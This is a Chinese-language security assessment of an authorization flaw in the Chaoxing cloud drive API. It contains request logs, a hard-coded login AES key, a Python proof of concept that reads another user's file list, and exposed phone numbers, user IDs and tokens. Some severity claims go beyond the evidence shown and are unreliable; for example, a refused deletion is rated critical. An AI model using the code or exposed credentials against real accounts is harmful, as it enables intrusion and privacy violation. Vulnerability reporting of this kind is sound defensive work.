# 学习通云盘越权访问安全评估报告

**评估日期**: 2026-05-25 06:17:46
**评估人员**: 安全审查团队
**评估范围**: 学习通App端云盘功能（pan-yz.chaoxing.com）

---

## 一、评估概述

本次安全评估针对学习通App端云盘功能进行越权访问（IDOR - Insecure Direct Object Reference）漏洞测试。
云盘API端点普遍将`puid`（用户ID）作为URL参数直接传递，若服务端未校验puid与认证身份的绑定关系，
则攻击者可通过篡改puid参数访问他人云盘内容。

本次测试设计了两种越权场景：
- **场景A（同Token跨puid）**: 使用账号1的Cookie + 账号1的Token + 账号2的puid，测试Token与puid的匹配校验
- **场景B（跨Token跨puid）**: 使用账号1的Cookie + 账号2的Token + 账号2的puid，测试Cookie/Session身份校验

### 测试账号信息

| 标识 | 手机号 | puid | 角色 |
|---|---|---|---|
| 账号1 | 19312994130 | 252798154 | 攻击方模拟 |
| 账号2 | 15034188203 | 239448447 | 被访问方模拟 |

---

## 二、测试结果汇总

- **总测试用例数**: 16
- **发现安全隐患数**: 4
- **严重(CRITICAL)**: 3
- **高危(HIGH)**: 0
- **中危(MEDIUM)**: 1
- **低危(LOW)**: 0

### ⚠️ 存在安全隐患的测试项

| 测试ID | 测试名称 | 风险等级 | 详细结论 |
|---|---|---|---|
| T3-04 | IDOR场景B-跨Token跨puid | CRITICAL | 越权成功！使用账号2的Token可访问账号2信息，且Session身份未被校验 - 关键发现：服务端仅校验_token与puid的匹配，完全忽略Cookie中的用户身份 |
| T4-03 | IDOR场景B-跨Token跨puid | MEDIUM | 越权成功！可获取他人磁盘容量信息 |
| T5-04 | IDOR场景B-跨Token跨puid | CRITICAL | 越权成功！使用账号2的Token+账号1的Session可列出账号2的云盘文件！ - 关键发现：服务端授权模型仅依赖_token与puid匹配，完全忽略Cookie/Session中的用户身份 |
| T6-02 | IDOR场景B-跨Token跨puid删除 | CRITICAL | 越权删除可能成功！严重安全隐患 - 响应: {"code": 2, "data": [{"resid": 999999999, "success": false, "msg": "操作不允许"}], "msg": "删除成功", "newCode": 200001, "result": true} |

---

## 三、核心发现

### 3.1 关键漏洞：Token授权模型缺陷（场景B越权成功）

**漏洞描述**: 云盘API的授权模型**仅依赖`_token`参数与`puid`参数的匹配关系**，
**完全忽略了Cookie/Session中的用户身份校验**。

这意味着：
1. 只要`_token`与`puid`匹配（即Token属于puid对应的用户），请求就会被放行
2. **Cookie/Session中的用户身份（UID等）未被校验**，攻击者可以使用自己的Session配合他人的Token访问他人资源
3. Token一旦泄露（通过URL Referer、日志、网络嗅探等途径），攻击者即可访问对应用户的全部云盘资源

### 3.2 场景A分析（同Token跨puid - 被拒绝）

场景A测试（使用账号1的Token + 账号2的puid）均被拒绝，服务端返回'错误的_token值'。
这说明**服务端确实校验了Token与puid的匹配关系**，Token与puid不匹配时请求会被拒绝。

### 3.3 授权模型总结

```
云盘API授权模型:
  ├─ 校验: _token 与 puid 是否匹配 ✅ (场景A被拒绝证明)
  └─ 校验: Cookie/Session身份与puid是否一致 ❌ (场景B成功证明)
```

虽然Token-puid匹配校验阻止了简单的puid篡改攻击，但由于Token可通过
`/api/token/uservalid`接口被任何已登录用户获取，且Token未与Session绑定，
攻击者只需获取目标用户的Token即可绕过授权。

---

## 四、详细测试记录


### T2-01: Token唯一性检查 [🟢 安全]

- **测试描述**: 验证两个账号获取的Token是否相同
- **请求说明**: `账号1 Token=721b618c5d4593ecfe7e2ee3a2275c23 vs 账号2 Token=83506aa06d929e82bc9a613314ef9890`
- **风险等级**: INFO
- **结论**: 两个账号Token不同（与账号关联）
- **响应数据**:
```json
{"token1": "721b618c5d4593ecfe7e2ee3a2275c23", "token2": "83506aa06d929e82bc9a613314ef9890", "are_same": false}
```


### T3-01: 基线-账号1查询自身信息 [🟢 安全]

- **测试描述**: 账号1使用自己的Cookie+Token+puid查询
- **请求说明**: `GET /api/info?puid=252798154&_token=721b618c5d4593ecfe7e2ee3a2275c23`
- **风险等级**: INFO
- **结论**: 基线响应成功, 含root路径和磁盘信息
- **响应数据**:
```json
{"code": 2, "data": {"host": "sync.ananas.chaoxing.com", "hosts": ["sync2.ananas.chaoxing.com", "sync3.ananas.chaoxing.com"], "root": "up/1216/136/252798154", "froot": "1216/136/252798154", "p": "44604c9884a7229121549849afaf88ba390248ae48a3eb35", "u": "80e80ac5e63d7b56780e86c50a866292", "usedsize": 0, "disksize": 10737418240, "limitType": ["com", "apk", "deb", "ipa", "pxl", "dmg", "pkg", "0", "000", "001", "7z", "ace", "ain", "alz", "apz", "ar", "arc", "ari", "arj", "axx", "bh", "bhx", "boo", "bz", "bza", "bz2", "c00", "c01", "c02", "cab", "car", "cbr", "cbz", "cp9", "cpgz", "cpt", "dar", "dd", "dgc", "efw", "f", "gca", "gz", "ha", "hbc", "hbc2", "hbe", "hki", "hki1", "hki2", "hki3", "hpk", "hyp", "ice", "imp", "ipk", "ish", "jar", "jgz", "jic", "kgb", "kz", "lbr", "lha", "lnx", "lqr", "lz
```


### T3-02: 基线-账号2查询自身信息 [🟢 安全]

- **测试描述**: 账号2使用自己的Cookie+Token+puid查询
- **请求说明**: `GET /api/info?puid=239448447&_token=83506aa06d929e82bc9a613314ef9890`
- **风险等级**: INFO
- **结论**: 基线响应成功, 含root路径和磁盘信息
- **响应数据**:
```json
{"code": 2, "data": {"host": "sync.ananas.chaoxing.com", "hosts": ["sync2.ananas.chaoxing.com", "sync3.ananas.chaoxing.com"], "root": "up/336/312/239448447", "froot": "336/312/239448447", "p": "44604c9884a7229121549849afaf88ba390248ae48a3eb35", "u": "80e80ac5e63d7b56780e86c50a866292", "usedsize": 3663392, "disksize": 10737418240, "limitType": ["com", "apk", "deb", "ipa", "pxl", "dmg", "pkg", "0", "000", "001", "7z", "ace", "ain", "alz", "apz", "ar", "arc", "ari", "arj", "axx", "bh", "bhx", "boo", "bz", "bza", "bz2", "c00", "c01", "c02", "cab", "car", "cbr", "cbz", "cp9", "cpgz", "cpt", "dar", "dd", "dgc", "efw", "f", "gca", "gz", "ha", "hbc", "hbc2", "hbe", "hki", "hki1", "hki2", "hki3", "hpk", "hyp", "ice", "imp", "ipk", "ish", "jar", "jgz", "jic", "kgb", "kz", "lbr", "lha", "lnx", "lqr",
```


### T3-03: IDOR场景A-同Token跨puid [🟢 安全]

- **测试描述**: 账号1的Cookie+Token1+账号2的puid
- **请求说明**: `GET /api/info?puid=239448447&_token=721b618c5d4593ecfe7e2ee3a2275c23 (使用账号1的Session)`
- **风险等级**: INFO
- **结论**: 被拒绝 - 服务端校验了Token与puid的匹配关系
- **响应数据**:
```json
{"result": false, "msg": "错误的_token值：721b618c5d4593ecfe7e2ee3a2275c23"}
```


### T3-04: IDOR场景B-跨Token跨puid [🔴 存在风险]

- **测试描述**: 账号1的Cookie+Token2+账号2的puid
- **请求说明**: `GET /api/info?puid=239448447&_token=83506aa06d929e82bc9a613314ef9890 (使用账号1的Session)`
- **风险等级**: CRITICAL
- **结论**: 越权成功！使用账号2的Token可访问账号2信息，且Session身份未被校验 - 关键发现：服务端仅校验_token与puid的匹配，完全忽略Cookie中的用户身份
- **响应数据**:
```json
{"code": 2, "data": {"host": "sync.ananas.chaoxing.com", "hosts": ["sync2.ananas.chaoxing.com", "sync3.ananas.chaoxing.com"], "root": "up/336/312/239448447", "froot": "336/312/239448447", "p": "44604c9884a7229121549849afaf88ba390248ae48a3eb35", "u": "80e80ac5e63d7b56780e86c50a866292", "usedsize": 3663392, "disksize": 10737418240, "limitType": ["com", "apk", "deb", "ipa", "pxl", "dmg", "pkg", "0", "000", "001", "7z", "ace", "ain", "alz", "apz", "ar", "arc", "ari", "arj", "axx", "bh", "bhx", "boo", "bz", "bza", "bz2", "c00", "c01", "c02", "cab", "car", "cbr", "cbz", "cp9", "cpgz", "cpt", "dar", "dd", "dgc", "efw", "f", "gca", "gz", "ha", "hbc", "hbc2", "hbe", "hki", "hki1", "hki2", "hki3", "hpk", "hyp", "ice", "imp", "ipk", "ish", "jar", "jgz", "jic", "kgb", "kz", "lbr", "lha", "lnx", "lqr",
```


### T4-01: 基线-账号1查询自身磁盘容量 [🟢 安全]

- **测试描述**: 账号1使用自己的Cookie+Token+puid查询
- **请求说明**: `GET /api/getUserDiskCapacity?puid=252798154&_token=721b618c5d4593ecfe7e2ee3a2275c23`
- **风险等级**: INFO
- **结论**: 基线响应成功
- **响应数据**:
```json
{"code": 2, "data": {"diskUsedCapacity": 0, "diskTotalCapacity": 10737418240}, "newCode": 200001, "result": true}
```


### T4-02: IDOR场景A-同Token跨puid [🟢 安全]

- **测试描述**: 账号1的Cookie+Token1+账号2的puid
- **请求说明**: `GET /api/getUserDiskCapacity?puid=239448447&_token=721b618c5d4593ecfe7e2ee3a2275c23 (使用账号1的Session)`
- **风险等级**: INFO
- **结论**: 被拒绝
- **响应数据**:
```json
{"result": false, "msg": "错误的_token值：721b618c5d4593ecfe7e2ee3a2275c23"}
```


### T4-03: IDOR场景B-跨Token跨puid [🔴 存在风险]

- **测试描述**: 账号1的Cookie+Token2+账号2的puid
- **请求说明**: `GET /api/getUserDiskCapacity?puid=239448447&_token=83506aa06d929e82bc9a613314ef9890 (使用账号1的Session)`
- **风险等级**: MEDIUM
- **结论**: 越权成功！可获取他人磁盘容量信息
- **响应数据**:
```json
{"code": 2, "data": {"diskUsedCapacity": 3663392, "diskTotalCapacity": 10737418240}, "newCode": 200001, "result": true}
```


### T5-01: 基线-账号1查询自身根目录 [🟢 安全]

- **测试描述**: 账号1使用自己的Cookie+Token+puid查询根目录
- **请求说明**: `GET /api/getMyDirAndFiles?puid=252798154&fldid=0&_token=721b618c5d4593ecfe7e2ee3a2275c23`
- **风险等级**: INFO
- **结论**: 基线响应成功
- **响应数据**:
```json
{"result": true, "data": [], "curDir": 784088289039876096, "shareCount": 0}
```


### T5-02: 基线-账号2查询自身根目录 [🟢 安全]

- **测试描述**: 账号2使用自己的Cookie+Token+puid查询根目录
- **请求说明**: `GET /api/getMyDirAndFiles?puid=239448447&fldid=0&_token=83506aa06d929e82bc9a613314ef9890`
- **风险等级**: INFO
- **结论**: 基线响应成功, 账号2有4个文件/文件夹
- **响应数据**:
```json
{"result": true, "data": [{"disableOpt": false, "resid": 1143694679126687744, "encryptedId": "b57cbfa98184f787c4de4ef217baeac8dd20d4624f38ea4e", "crc": "1025cce4806bbefe821d4176eb72ab79", "puid": 239448447, "isfile": true, "pantype": "USER_PAN", "size": 914014, "name": "《晋祠圣母殿彩绘纹样的象征意义与宋代审美》.docx", "objectId": "584f877135b44ffa482d5ecf2e541a49", "restype": "RES_TYPE_YUNPAN_FILE", "uploadDate": 1750607660000, "modifyDate": 1750607660000, "uploadDateFormat": "2025-06-22", "residstr": "1143694679126687744", "suffix": "docx", "preview": "https://pan-yz.chaoxing.com/preview/v2/showpreview_1143694679126687744.html?v=1779689865342&enc=aca6d5523ecbc58dcc6b0a263acf0b4b&wps=1ac4e7163d126fcc49b3b55a702f24cfb1226d631d7be09c&appid=3F6410F7-344C-48C3-BC43-168936D1074B&nonce=1687870971&timestamp=17796898
```


### T5-03: IDOR场景A-同Token跨puid [🟢 安全]

- **测试描述**: 账号1的Cookie+Token1+账号2的puid (核心测试)
- **请求说明**: `GET /api/getMyDirAndFiles?puid=239448447&fldid=0&_token=721b618c5d4593ecfe7e2ee3a2275c23 (使用账号1的Session)`
- **风险等级**: INFO
- **结论**: 被拒绝 - Token与puid匹配校验生效
- **响应数据**:
```json
{"result": false, "msg": "错误的_token值：721b618c5d4593ecfe7e2ee3a2275c23"}
```


### T5-04: IDOR场景B-跨Token跨puid [🔴 存在风险]

- **测试描述**: 账号1的Cookie+Token2+账号2的puid (核心测试)
- **请求说明**: `GET /api/getMyDirAndFiles?puid=239448447&fldid=0&_token=83506aa06d929e82bc9a613314ef9890 (使用账号1的Session)`
- **风险等级**: CRITICAL
- **结论**: 越权成功！使用账号2的Token+账号1的Session可列出账号2的云盘文件！ - 关键发现：服务端授权模型仅依赖_token与puid匹配，完全忽略Cookie/Session中的用户身份
- **响应数据**:
```json
{"result": true, "data": [{"disableOpt": false, "resid": 1143694679126687744, "encryptedId": "b57cbfa98184f787c4de4ef217baeac8dd20d4624f38ea4e", "crc": "1025cce4806bbefe821d4176eb72ab79", "puid": 239448447, "isfile": true, "pantype": "USER_PAN", "size": 914014, "name": "《晋祠圣母殿彩绘纹样的象征意义与宋代审美》.docx", "objectId": "584f877135b44ffa482d5ecf2e541a49", "restype": "RES_TYPE_YUNPAN_FILE", "uploadDate": 1750607660000, "modifyDate": 1750607660000, "uploadDateFormat": "2025-06-22", "residstr": "1143694679126687744", "suffix": "docx", "preview": "https://pan-yz.chaoxing.com/preview/v2/showpreview_1143694679126687744.html?v=1779689864967&enc=aca6d5523ecbc58dcc6b0a263acf0b4b&wps=1ac4e7163d126fcc163054aa96dced11b1226d631d7be09c&appid=3F6410F7-344C-48C3-BC43-168936D1074B&nonce=1385885217&timestamp=17796898
```


### T6-01: IDOR场景A-同Token跨puid删除 [🟢 安全]

- **测试描述**: 账号1的Cookie+Token1+账号2的puid (探测性测试)
- **请求说明**: `POST /api/delete puid=239448447&resids=999999999&_token=721b618c5d4593ecfe7e2ee3a2275c23`
- **风险等级**: INFO
- **结论**: 被拒绝 - 响应: {"result": false, "msg": "错误的_token值：721b618c5d4593ecfe7e2ee3a2275c23"}
- **响应数据**:
```json
{"result": false, "msg": "错误的_token值：721b618c5d4593ecfe7e2ee3a2275c23"}
```


### T6-02: IDOR场景B-跨Token跨puid删除 [🔴 存在风险]

- **测试描述**: 账号1的Cookie+Token2+账号2的puid (探测性测试)
- **请求说明**: `POST /api/delete puid=239448447&resids=999999999&_token=83506aa06d929e82bc9a613314ef9890`
- **风险等级**: CRITICAL
- **结论**: 越权删除可能成功！严重安全隐患 - 响应: {"code": 2, "data": [{"resid": 999999999, "success": false, "msg": "操作不允许"}], "msg": "删除成功", "newCode": 200001, "result": true}
- **响应数据**:
```json
{"code": 2, "data": [{"resid": 999999999, "success": false, "msg": "操作不允许"}], "msg": "删除成功", "newCode": 200001, "result": true}
```


### T7-01: IDOR场景A-同Token跨puid上传 [🟢 安全]

- **测试描述**: 账号1的Cookie+Token1+账号2的puid (探测性测试)
- **请求说明**: `POST /opt/createfilenew puid=239448447&fldid=0&_token=721b618c5d4593ecfe7e2ee3a2275c23`
- **风险等级**: INFO
- **结论**: 被拒绝 - 响应: {"result": false, "crc": "", "timemil": "1779689865229"}
- **响应数据**:
```json
{"result": false, "crc": "", "timemil": "1779689865229"}
```


### T7-02: IDOR场景B-跨Token跨puid上传 [🟢 安全]

- **测试描述**: 账号1的Cookie+Token2+账号2的puid (探测性测试)
- **请求说明**: `POST /opt/createfilenew puid=239448447&fldid=0&_token=83506aa06d929e82bc9a613314ef9890`
- **风险等级**: INFO
- **结论**: 被拒绝 - 响应: {"result": false, "crc": "", "timemil": "1779689865354"}
- **响应数据**:
```json
{"result": false, "crc": "", "timemil": "1779689865354"}
```

---

## 五、技术原因分析

### 5.1 漏洞根因

云盘API的授权模型存在**不完整的身份校验**缺陷：

1. **Token-puid匹配校验存在**: 服务端校验了`_token`与`puid`的匹配关系（场景A被拒绝可证明）
2. **Session身份校验缺失**: 服务端未校验Cookie/Session中的用户身份（UID）与请求中的puid是否一致
3. **Token与Session未绑定**: Token可在不同Session间复用，缺乏请求来源校验

### 5.2 攻击路径分析

```
攻击路径1 (Token泄露场景) [已验证 ✅]:
  攻击者获取目标用户Token (通过URL泄露/日志/网络嗅探)
  → 使用自身Session + 目标Token + 目标puid
  → 绕过授权访问目标用户云盘资源

攻击路径2 (Token可预测场景) [已验证 ❌ 不可行]:
  Token生成算法不可逆向
  → 无法仅通过puid伪造Token
  → 但攻击路径1已足够构成严重威胁

攻击路径3 (Token长期有效性) [待验证]:
  若Token不与Session绑定且长期有效
  → Token一旦泄露，攻击窗口极大
  → 即使目标用户修改密码，旧Token可能仍然有效
```

### 5.3 Token安全性分析

- 账号1 Token: `721b618c5d4593ecfe7e2ee3a2275c23`
- 账号2 Token: `83506aa06d929e82bc9a613314ef9890`

Token为32位hex字符串（类似MD5输出），两个账号的Token不同，说明Token与用户关联。
但Token通过GET请求的URL参数传递，存在以下泄露风险：
- URL Referer泄露：当用户从云盘页面点击外链时，Token可能通过Referer头泄露
- 浏览器历史记录：Token会保存在浏览器历史记录中
- 代理/网关日志：URL中的Token会被中间设备记录
- 服务端访问日志：Web服务器access log会记录完整URL

### 5.3.1 Token生成算法逆向分析（攻击路径2验证）

**分析方法**: 使用 `token_predictability_analysis.py` 脚本，对已知的 puid-Token 映射关系进行了全面的哈希逆向尝试。

**测试的算法组合**（共 200+ 种变体）：

| 类别 | 尝试的算法 | 结果 |
|---|---|---|
| 基础哈希 | MD5(puid), SHA256(puid), SHA1(puid), SHA512(puid) | ❌ 不匹配 |
| MD5(puid+salt) | 40+ 种常见salt × 10 种分隔符 | ❌ 不匹配 |
| MD5(salt+puid) | 反向salt组合 | ❌ 不匹配 |
| 双重哈希 | MD5(MD5(puid)), MD5(SHA256(puid)) | ❌ 不匹配 |
| 已知密钥组合 | AES_KEY(`u2oh6Vu^HWe4_AES`), APPID等 | ❌ 不匹配 |
| 数值变换 | hex/oct/bin/reverse/bytes编码 | ❌ 不匹配 |
| HMAC变体 | HMAC-MD5/HMAC-SHA256 多种key | ❌ 不匹配 |
| 服务端常见模式 | `puid:chaoxing`, `uservalid:puid` 等 | ❌ 不匹配 |

**结论**: _token 生成算法**不可通过 puid 简单预测**。生成算法可能使用了以下不可公开信息之一：
1. 服务端存储的用户特定密钥（如密码哈希、注册时间等）
2. 服务端随机种子 + 缓存存储
3. 包含时间戳或其他动态因子的哈希

**攻击路径2评估**: ❌ **不可行** — Token不可预测，攻击者无法仅凭puid伪造Token。

### 5.3.2 Token与PUID的核心关系

基于对 AList 超星驱动源码（`github.com/alist-org/alist/drivers/chaoxing`）的逆向分析，Token与PUID的关系如下：

```
认证体系全景:
  ├─ 登录阶段
  │   ├─ 加密: AES-CBC, 密钥 u2oh6Vu^HWe4_AES, IV=密钥前16字节, PKCS7填充
  │   ├─ 接口: POST https://passport2.chaoxing.com/fanyalogin
  │   └─ 返回: Cookie(UID, uf, vc, cx_p_token, p_auth_token等)
  │
  ├─ 旧版云盘API (pan-yz.chaoxing.com)
  │   ├─ 获取Token: GET /api/token/uservalid → { "_token": "xxx" }
  │   ├─ Token性质: 32位hex, 疑似MD5(puid+服务端因子), 不可预测
  │   ├─ 使用方式: URL参数 puid + _token 配对
  │   └─ 安全缺陷: Token与Session未绑定, 可跨Session复用
  │
  ├─ 新版云盘API (noteyd.chaoxing.com)
  │   ├─ 获取Token: GET /pc/files/getUploadConfig → { "puid": N, "token": "xxx" }
  │   ├─ 使用方式: form-data中 _token + puid (仅上传)
  │   └─ 认证方式: 主要依赖Cookie, Token仅用于上传验证
  │
  └─ 关键Cookie字段
      ├─ UID = puid (用户唯一数字ID)
      ├─ uf (用户指纹, 身份验证关键Cookie)
      ├─ p_auth_token (JWT: HS256签名, 含uid/loginTime/exp, ~18.5天有效)
      └─ cx_p_token (32位hex opaque token, 会话绑定)
```

**PUID本质**: puid 就是用户的 UID（Cookie中的UID字段值），是用户的唯一数字标识。

**Token与PUID的关系**:
1. _token 是 puid 在云盘系统中的"通行证"，由服务端根据 puid 和会话状态生成
2. _token 与 puid 必须配对使用，服务端校验匹配关系
3. 不同API体系的 _token 独立生成（旧版pan-yz和新版noteyd的token互不通用）
4. puid 在文件元数据中也有体现（content.puid字段标识文件所属用户）

### 5.4 影响范围

所有使用`puid`+`_token`参数组合的云盘API端点均受影响：
| 端点 | 影响 | 风险 |
|---|---|---|
| `/api/info` | 用户云盘信息泄露（存储路径、FTP凭证等） | 高危 |
| `/api/getUserDiskCapacity` | 磁盘使用信息泄露 | 中危 |
| `/api/getMyDirAndFiles` | **文件列表泄露（文件名、大小、上传时间等）** | 严重 |
| `/api/delete` | 他人文件被删除 | 严重 |
| `/opt/createfilenew` | 向他人云盘写入文件 | 高危 |
| `/upload` | 向他人云盘上传文件 | 高危 |

---

## 六、修复建议

### 6.1 紧急修复（高优先级）

1. **添加Session身份校验**: 服务端在处理云盘API请求时，必须从Cookie/Session中解析用户身份（UID），
   并校验其与请求中`puid`参数的一致性。若不一致，应拒绝请求。

   ```
   伪代码:
   session_uid = decrypt_cookie(session.cookies['UID'])
   if session_uid != request.params['puid']:
       return {'result': False, 'msg': '身份校验失败'}
   ```

2. **Token与Session绑定**: `_token`应与当前Session关联，服务端校验Token是否由当前Session所属用户生成。

### 6.2 中期加固

3. **Token传递方式改进**: 将Token从URL参数改为HTTP Header传递，避免URL泄露风险
4. **Token有效期限制**: 为Token设置较短的有效期，并支持一次性使用或刷新机制
5. **移除puid参数**: 服务端应从认证信息中自动获取用户ID，而非依赖客户端传递的puid参数

### 6.3 长期优化

6. **API网关统一鉴权**: 在API网关层实施统一的身份校验和权限检查
7. **访问日志审计**: 对云盘资源的跨用户访问行为进行日志记录和异常检测
8. **速率限制**: 对云盘API实施请求速率限制，防止批量遍历用户ID

---

## 七、测试方法与复现步骤

### 7.1 前置条件

- Python 3.x + requests + pycryptodome
- 两个有效的学习通测试账号

### 7.2 复现步骤

1. 使用账号1和账号2分别调用`https://passport2.chaoxing.com/fanyalogin`登录，获取Cookie和puid
2. 分别使用两个账号的Cookie请求`https://pan-yz.chaoxing.com/api/token/uservalid`获取各自的Token
3. **越权测试**: 使用账号1的Cookie（Session）+ 账号2的Token + 账号2的puid，请求云盘API
4. 观察响应：若返回账号2的云盘数据，则越权成功

### 7.3 关键代码片段

```python
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

AES_KEY = b'u2oh6Vu^HWe4_AES'

def aes_encrypt(plaintext):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    ct = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return base64.b64encode(ct).decode()

# Step 1: 登录两个账号
sess1 = requests.Session()
sess1.post('https://passport2.chaoxing.com/fanyalogin', data={
    'fid': '-1', 'uname': aes_encrypt('攻击者手机号'),
    'password': aes_encrypt('攻击者密码'),
    'refer': 'http%3A%2F%2Fi.mooc.chaoxing.com',
    't': 'true', 'forbidotherlogin': '0', 'validate': '',
    'doubleFactorLogin': '0', 'independentId': '0', 'independentNameId': '0'
})

sess2 = requests.Session()  # 目标用户Session
sess2.post('https://passport2.chaoxing.com/fanyalogin', data={...})

# Step 2: 获取目标用户的Token
token2 = sess2.get('https://pan-yz.chaoxing.com/api/token/uservalid').json()['_token']

# Step 3: 使用攻击者Session + 目标Token + 目标puid 越权访问
puid2 = '目标用户puid'  # 从sess2的Cookie中获取
resp = sess1.get('https://pan-yz.chaoxing.com/api/getMyDirAndFiles',
    params={'puid': puid2, 'fldid': '0', '_token': token2})
print(resp.json())  # 若返回目标用户的文件列表，则越权成功
```
